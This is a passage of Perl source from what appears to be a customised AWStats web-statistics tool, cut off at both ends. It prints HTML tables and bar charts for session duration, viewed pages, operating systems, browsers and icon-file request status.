		$average_s += ( $_session{$key} || 0 ) * $avg;
		$Totals += $_session{$key} || 0;
	}
	if ($Totals) { $average_s = int( $average_s / $Totals ); }
	else { $average_s = '?'; }
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(1)
	  . "><th width=\"200\">"
	  . _t("Visits") . ": ".Format_Number($TotalVisits)." - " 
	  . _t("Average") . ": ".Format_Number($average_s)." " . _t("unit_s") . "</th>\n"
	  . "<th bgcolor=\"#$color_s\" width=\"80\">" . _t("Visits") . "</th>\n"
	  . "<th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th>\n"
	  . "</tr>\n";
	
	my $total_s = 0;
	foreach my $i (0 .. $#session_keys) {
		my $key = $session_keys[$i];
		my $display = $session_display[$i];
		my $value = $_session{$key} || 0;
		my $p = $TotalVisits ? int( $value / $TotalVisits * 1000 ) / 10 : 0;
		$total_s += $value;
		
		print "<tr>";
		print "<td class=\"aws\" width=\"200\">$display<\/td>\n";
		print "<td class=\"aws\" align=\"right\">" . Format_Number($value) . "<\/td>\n";
		print "<td class=\"aws\" align=\"right\">$p%<\/td>\n";
		print "</tr>\n";
	}

	my $rest_s = $TotalVisits - $total_s;
	if ( $rest_s > 0 ) {
		my $p = $TotalVisits ? int( $rest_s / $TotalVisits * 1000 ) / 10 : 0;
		print "<tr" . Tooltip(20) . ">";
		print "<td class=\"aws\" width=\"200\"><span style=\"color: #$color_other\">" . _t("PageStayTime") . "<\/span><\/td>\n";
		print "<td class=\"aws\" align=\"right\">" . Format_Number($rest_s) . "<\/td>\n";
		print "<td class=\"aws\" align=\"right\">" . ( $rest_s ? "$p%" : "&nbsp;" ) . "<\/td>\n";
		print "</tr>\n";
	}
	
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the pages chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainPages{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) {
		debug( "ShowPagesStats (MaxNbOf{'PageShown'}=$MaxNbOf{'PageShown'} TotalDifferentPages=$TotalDifferentPages)",
			2
		);
	}
	my $regext = qr/\.(\w{1,6})$/;
	print "$Center<a name=\"urls\">&nbsp;</a><a name=\"entry\">&nbsp;</a><a name=\"exit\">&nbsp;</a>";
	my $title = "👁️ " . _t("Viewed pages") . " (" . _t("Top") 
	  . " $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=urldetail")
		: "$StaticLinks.urldetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	if ( $ShowPagesStats =~ /E/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=urlentry")
			: "$StaticLinks.urlentry.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Entry") . "</a>";
	}
	if ( $ShowPagesStats =~ /X/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
			: "$StaticLinks.urlexit.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Exit") . "</a>";
	}
	# extend the title to include the added link
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		   $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
		   "$AddLinkToExternalCGIWrapper" . "?section=SIDER&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
			
	&tab_head( "$title", 19, 0, 'urls' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentPages)." " . _t("Different pages") . "</th>\n";
	if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) { print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n"; }
	if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) { print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n"; }
	if ( $ShowPagesStats =~ /B/i ) { print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n"; }
	if ( $ShowPagesStats =~ /E/i ) { print "<th bgcolor=\"#$color_e\" width=\"80\">" . _t("Entry") . "</th>\n"; }
	if ( $ShowPagesStats =~ /X/i ) { print "<th bgcolor=\"#$color_x\" width=\"80\">" . _t("Exit") . "</th>\n"; }

	# Call to plugins' function ShowPagesAddField
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
	{
		# my $function="ShowPagesAddField_$pluginname('title')";
		# eval("$function");
		my $function = "ShowPagesAddField_$pluginname";
		&$function('title');
	}
	print "<th>&nbsp;</th>\n</tr>\n";
	my $total_p = my $total_e = my $total_x = my $total_k = 0;
	my $max_p   = 1;
	my $max_k   = 1;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p, \%_url_p );
	foreach my $key (@keylist) {
		if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
		if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) { $max_k = $_url_k{$key} / ( $_url_p{$key} || 1 ); }
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>\n";
		my $bredde_p = 0;
		my $bredde_e = 0;
		my $bredde_x = 0;
		my $bredde_k = 0;
		if ( $max_p > 0 ) { $bredde_p = int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1; }
		if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
		if ( $max_p > 0 ) { $bredde_e = int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1; }
		if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
		if ( $max_p > 0 ) { $bredde_x = int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1; }
		if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
		if ( $max_k > 0 ) { $bredde_k = int( $BarWidth * ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) / $max_k ) + 1; }
		if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) { print "<td>".Format_Number($_url_p{$key})."</td>\n"; }
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) { print "<td>".Format_Number($_url_p{$key})."</td>\n"; }
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>\n"
			  . (
				$_url_k{$key}
				? Format_Bytes(
					$_url_k{$key} / ( $_url_p{$key} || 1 )
				  )
				: "&nbsp;"
			  )
			  . "</td>\n";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>"
			  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>"
			  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>\n";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

			# my $function="ShowPagesAddField_$pluginname('$key')";
			# eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function($key);
		}
		print "<td class=\"aws\">";
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Pages") . ": " . Format_Number($_url_p{$key}) . "\"></div>";
		}
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
			print "<div style=\"background-color: #$color_h; width: ${bredde_p}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Hits") . ": " . Format_Number($_url_p{$key}) . "\"></div>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<div style=\"background-color: #$color_k; width: ${bredde_k}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Average") . ": " . Format_Bytes( $_url_k{$key} / ( $_url_p{$key} || 1 ) ) . "\"></div>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<div style=\"background-color: #$color_e; width: ${bredde_e}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Entry") . ": " . Format_Number($_url_e{$key}) . "\"></div>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<div style=\"background-color: #$color_x; width: ${bredde_x}px; height: 4px; border-radius: 2px;\" title=\"" . _t("Exit") . ": " . Format_Number($_url_x{$key}) . "\"></div>";
		}
		print "</td>\n</tr>\n";
		$total_p += $_url_p{$key} || 0;
		$total_e += $_url_e{$key} || 0;
		$total_x += $_url_x{$key} || 0;
		$total_k += $_url_k{$key} || 0;
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_e = $TotalEntries - $total_e;
	my $rest_x = $TotalExits - $total_x;
	my $rest_k = $TotalBytesPages - $total_k;
	if ( $rest_p > 0 || $rest_k > 0 || $rest_e > 0 || $rest_x > 0 )
	{    # All other urls
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Displaying10RowsPageMorePleaseViewFullList") . "</span></td>\n";
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
			print "<td>".Format_Number($rest_p)."</td>\n";
		}
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
			print "<td>".Format_Number($rest_p)."</td>\n";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$rest_k
				? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
				: "&nbsp;"
			  )
			  . "</td>\n";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>\n";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

			# my $function="ShowPagesAddField_$pluginname('')";
			# eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function('');
		}
		print "<td>&nbsp;</td>\n</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the OS chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainOS{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;

	if ($Debug) { debug( "ShowOSStats", 2 ); }
	print "$Center<a name=\"os\">&nbsp;</a>";
	my $Totalh   = 0;
	my $Totalp   = 0;
	my %new_os_h = ();
	my %new_os_p = ();
  OSLOOP: foreach my $key ( keys %_os_h ) {
		$Totalh += $_os_h{$key};
		$Totalp += $_os_p{$key};
		foreach my $family ( keys %OSFamily ) {
			if ( $key =~ /^$family/i ) {
				$new_os_h{"${family}cumul"} += $_os_h{$key};
				$new_os_p{"${family}cumul"} += $_os_p{$key};
				next OSLOOP;
			}
		}
		$new_os_h{$key} += $_os_h{$key};
		$new_os_p{$key} += $_os_p{$key};
	}
	my $title = "🖥️ " . _t("Operating Systems") 
	  . " (" . _t("Top") . " $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\""
	  . ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=osdetail")
		: "$StaticLinks.osdetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "/" . _t("DetailedOS") . "</a> &nbsp; - &nbsp; <a href=\""
	  . ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownos")
		: "$StaticLinks.unknownos.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unknown OS (Link)") . "</a>";
	  
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title 
		   .= " &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" . "?section=OS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
	&tab_head( "$title", 19, 0, 'os' );
	&BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \%new_os_h, \%new_os_p );
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int(  $new_os_h{$key} / $Totalh * 1000 ) / 10;
				if ($key eq 'Unknown'){
					push @blocklabel, "$key";
				}
				else{
					my $keywithoutcumul = $key;
					$keywithoutcumul =~ s/cumul$//i;
					my $libos;

					my ($is_device, $display_name, $icon_name) = parse_device_key($key);
					if ($is_device) {
						$libos = $display_name;
					} else {
						$libos = $OSHashLib{$keywithoutcumul} || $keywithoutcumul;
						if ( $OSFamily{$keywithoutcumul} ) {
							$libos = $OSFamily{$keywithoutcumul};
						}
					}
					push @blocklabel, "$libos";
				}
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Top 5 Operating Systems"),       "oss",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>" . _t("Operating Systems") . "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $new_os_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalp) {
			$p_p = int( $new_os_p{$key} / $Totalp * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
				. ( $count ? "" : " width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\"" )
				. "><img src=\"$DirIcons\/os\/unknown.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />"
				. "<\/td>\n"
				. "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown OS (Row)") . "<\/span><\/td>\n"
				. "<td width=\"80\">" . Format_Number($_os_p{$key}) . "<\/td>\n"
				. "<td width=\"80\">$p_p<\/td>\n"
				. "<td width=\"80\">" . Format_Number($_os_h{$key}) . "<\/td>\n"
				. "<td width=\"80\">$p_h<\/td>\n<\/tr>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libos;
			my $icon_display;
			
			my ($is_device, $display_name, $icon_name) = parse_device_key($key);
			if ($is_device) {
				$libos = $display_name;
				$icon_display = "<span style=\"font-size:24px;\">$icon_name</span>";
			} else {
				$libos = $OSHashLib{$keywithoutcumul} || $keywithoutcumul;
				my $nameicon = $keywithoutcumul;
				$nameicon =~ s/[^\w]//g;
				$icon_display = "<img src=\"$DirIcons\/os\/$nameicon.svg\""
					. AltTitle("")
					. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />";
				if ( $OSFamily{$keywithoutcumul} ) {
					$libos = "<b>" . $OSFamily{$keywithoutcumul} . "</b>";
				}
			}
			
			print "<tr><td"
				. ( $count ? "" : " width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\"" )
				. ">$icon_display"
				. "<\/td>\n"
				. "<td class=\"aws\">$libos<\/td>\n"
				. "<td width=\"80\">" . Format_Number($new_os_p{$key}) . "<\/td>\n"
				. "<td width=\"80\">$p_p<\/td>\n"
				. "<td width=\"80\">" . Format_Number($new_os_h{$key}) . "<\/td>\n"
				. "<td width=\"80\">$p_h<\/td>\n<\/tr>\n";
		}
		$total_h += $new_os_h{$key};
		$total_p += $new_os_p{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $Totalh / $total_h", 2 );
	}
	my $rest_h = $Totalh - $total_h;
	my $rest_p = $Totalp - $total_p;
	if ( $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
		if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
		print "<tr>";
		print "<td>&nbsp;</td>\n";
		print "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (OS main)") . "</span></td><td>".Format_Number($rest_p)."</td>\n";
		print "<td>$p_p %</td>\n<td>".Format_Number($rest_h)."</td>\n<td>$p_h %</td>\n</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browsers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainBrowsers{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowBrowsersStats", 2 ); }
	print "$Center<a name=\"browsers\">&nbsp;</a>";
	my $Totalh        = 0;
	my $Totalp        = 0;
	my %new_browser_h = ();
	my %new_browser_p = ();
  	BROWSERLOOP: foreach my $key ( keys %_browser_h ) {
		$Totalh += $_browser_h{$key};
		$Totalp += $_browser_p{$key};
		foreach my $family ( keys %BrowsersFamily ) {
			if ( $key =~ /^$family/i ) {
				$new_browser_h{"${family}cumul"} += $_browser_h{$key};
				$new_browser_p{"${family}cumul"} += $_browser_p{$key};
				next BROWSERLOOP;
			}
		}
		$new_browser_h{$key} += $_browser_h{$key};
		$new_browser_p{$key} += $_browser_p{$key};
	}
	my $title = "🌐 " . _t("Browsers") . " (" . _t("Top") 
	  . " $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=browserdetail")
		: "$StaticLinks.browserdetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "/" . _t("DetailedBS") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownbrowser")
		: "$StaticLinks.unknownbrowser.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unknown Browser (Link)") . "</a>";
	  
	# extend the title to include the added link
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		   $title 
		   .= " &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=BROWSER&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
			  
	&tab_head( "$title", 19, 0, 'browsers' );
	
	&BuildKeyList(
		$MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},
		\%new_browser_h,           \%new_browser_p
	);
	
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int(  $new_browser_h{$key} / $TotalHits * 1000 ) / 10;
				if ($key eq 'Unknown'){
					push @blocklabel, "$key";
				}
				else{
					my $keywithoutcumul = $key;
					$keywithoutcumul =~ s/cumul$//i;
					my $libbrowser;
					
					my ($is_device, $display_name, $icon_name) = parse_device_key($key);
					if ($is_device) {
						$libbrowser = $display_name;
					} else {
						$libbrowser = $BrowsersHashIDLib{$keywithoutcumul} || $keywithoutcumul;
						if ( $BrowsersFamily{$keywithoutcumul} ) {
							$libbrowser = "$libbrowser";
						}
					}
					push @blocklabel, "$libbrowser";
				}
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Top 5 Browsers"),   "browsers",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td>\n</tr>\n";
		}
	}
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th>\n<th>" . _t("Browsers") . "</th>\n<th width=\"80\">" . _t("Unique visitors") . "</th>\n<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $new_browser_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalp) {
			$p_p = int( $new_browser_p{$key} / $Totalp * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><span style=\"font-size:24px;\">❓</span>"
			  . "</td>\n<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown Browser (Row)") . "</span></td>\n<td width=\"80\">?</td>\n"
			  . "<td>".Format_Number($_browser_p{$key})."</td>\n<td>$p_p</td>\n"
			  . "<td>".Format_Number($_browser_h{$key})."</td>\n<td>$p_h</td>\n</tr>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libbrowser;
			my $icon_display;
			
			my ($is_device, $display_name, $icon_name) = parse_device_key($key);
			if ($is_device) {
				$libbrowser = $display_name;
				$icon_display = "<span style=\"font-size:24px;\">$icon_name</span>";
			} else {
				$libbrowser = $BrowsersHashIDLib{$keywithoutcumul} || $keywithoutcumul;
				my $nameicon = $BrowsersHashIcon{$keywithoutcumul} || "notavailable";
				$icon_display = "<img src=\"$DirIcons\/os\/$nameicon.svg\""
					. AltTitle("")
					. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />";
				if ( $BrowsersFamily{$keywithoutcumul} ) {
					$libbrowser = "<b>$libbrowser</b>";
				}
			}
			
			print "<tr><td"
				. ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
				. ">$icon_display"
				. "<td class=\"aws\">"
				. ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
				. "$libbrowser"
				. ( $PageDir eq 'rtl' ? "</span>" : "" )
				. "</td>\n<td>"
				. (
				$BrowsersHereAreGrabbers{$key}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td>\n<td>".Format_Number($new_browser_p{$key})."</td>\n<td>$p_p</td>\n<td>".Format_Number($new_browser_h{$key})."</td>\n<td>$p_h</td>\n</tr>\n";
		}
		$total_h += $new_browser_h{$key};
		$total_p += $new_browser_p{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $Totalh / $total_h", 2 );
	}
	my $rest_h = $Totalh - $total_h;
	my $rest_p = $Totalp - $total_p;
	if ( $rest_h > 0 ) {
		my $p_p = 0.0;
		my $p_h;
		if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
		if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
		print "<tr>";
		print "<td>&nbsp;</td>\n";
		print "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Only 10 lines of browser data are currently displayed") . "</span></td>\n<td>&nbsp;</td>\n<td>$rest_p</td>\n";
		print "<td>$p_p %</td>\n<td>$rest_h</td>\n<td>$p_h %</td>\n</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     HTMLShowIconStatus - 显示图标请求状态统计
#------------------------------------------------------------------------------
sub HTMLShowIconStatus {
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	return unless scalar keys %_icon_status;
	
	print "$Center<a name=\"iconstatus\">&nbsp;</a>";
	my $title = "🖼️ " . _t("Icon Files Status");
	&tab_head( "$title", 19, 0, 'iconstatus' );
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th>" . _t("Icon Type") . "</th>\n";
	print "<th bgcolor=\"#$color_success\" width=\"80\">200</th>\n";
	print "<th bgcolor=\"#$color_error\" width=\"80\">404</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Total") . "</th>\n";
	print "<th width=\"220\">" . _t("Expected Path") . "</th>\n";
	print "<th>&nbsp;</th>\n";
	print "</tr>\n";
	
	my @icon_types = qw(
		favicon 
		apple_touch 
		logo 
		webmanifest 
		browserconfig
		safari_pinned 
		social_icon
	);
	
	my %icon_names = (
		'favicon'        => "⭐ " . _t("Favicon"),
		'apple_touch'    => "🍎 " . _t("Apple Touch Icon (iOS/macOS)"),
		'logo'           => "🏷️ " . _t("Site Logo"),
		'webmanifest'    => "📱 " . _t("Web App Manifest (Android/Chrome)"),
		'browserconfig'  => "🪟 " . _t("Windows Browser Config"),
		'safari_pinned'  => "🎯 " . _t("Safari Pinned Tab"),
		'social_icon'    => "🔗 " . _t("Social Icon"),
	);
	
	my %expected_paths = (
		'favicon'        => '_PATH_FAVICON',
		'apple_touch'    => '_PATH_APPLE_TOUCH',
		'logo'           => '_PATH_LOGO',
		'webmanifest'    => '_PATH_WEBMANIFEST',
		'browserconfig'  => '_PATH_BROWSERCONFIG',
		'safari_pinned'  => '_PATH_SAFARI_PINNED',
		'social_icon'    => '_PATH_SOCIAL_ICON',
	);

	foreach my $type (@icon_types) {
		if (!exists $_icon_status{$type}) {
			$_icon_status{$type}{'200'} = 0;
			$_icon_status{$type}{'404'} = 0;
			$_icon_status{$type}{'other'} = 0;
		}
	}

	my $max_ok    = 1;
	my $max_miss  = 1;
	my $max_total = 1;
	foreach my $type (@icon_types) {
		my $ok    = $_icon_status{$type}{'200'}   || 0;
		my $miss  = $_icon_status{$type}{'404'}   || 0;
		my $total = $ok + $miss;
		
		$max_ok    = $ok    if $ok    > $max_ok;
		$max_miss  = $miss  if $miss  > $max_miss;
		$max_total = $total if $total > $max_total;
	}
	
	foreach my $type (@icon_types) {
		my $ok    = $_icon_status{$type}{'200'}   || 0;
		my $miss  = $_icon_status{$type}{'404'}   || 0;
		my $total = $ok + $miss;
		my $ok_pct    = $total ? int( $ok / $total * 1000 ) / 10 : 0;
		my $miss_pct  = $total ? int( $miss / $total * 1000 ) / 10 : 0;
		
		# 各进度条宽度（最大 200px）
		my $bar_ok    = $max_ok    ? int( 200 * $ok    / $max_ok )    + 1 : 1;
		my $bar_miss  = $max_miss  ? int( 200 * $miss  / $max_miss )  + 1 : 1;
		my $bar_total = $max_total ? int( 200 * $total / $max_total ) + 1 : 1;
		
		$bar_ok    = 2 if $bar_ok == 1 && $ok > 0;
		$bar_miss  = 2 if $bar_miss == 1 && $miss > 0;
		$bar_total = 2 if $bar_total == 1 && $total > 0;
		
		# 获取期望路径
		my $expected_path = _t($expected_paths{$type});
		
		print "<tr>";
		print "<td class=\"aws\">" . ($icon_names{$type} || $type) . "</td>\n";
		print "<td class=\"aws\" align=\"right\"><b>" . Format_Number($ok) . "</b>($ok_pct%)</td>\n";
		print "<td class=\"aws\" align=\"right\"><b>" . Format_Number($miss) . "</b>($miss_pct%)</td>\n";
		print "<td class=\"aws\" align=\"right\"><b>" . Format_Number($total) . "</b></td>\n";
		print "<td class=\"aws\" style=\"font-size: 11px; word-break: break-word;\">$expected_path</td>\n";
		print "<td class=\"aws\" style=\"padding: 4px 0;\">";
		print "<div style=\"display: flex; align-items: center; margin-bottom: 4px;\">";
		print "<span style=\"width: 45px; font-size: 10px;\">200:</span>";
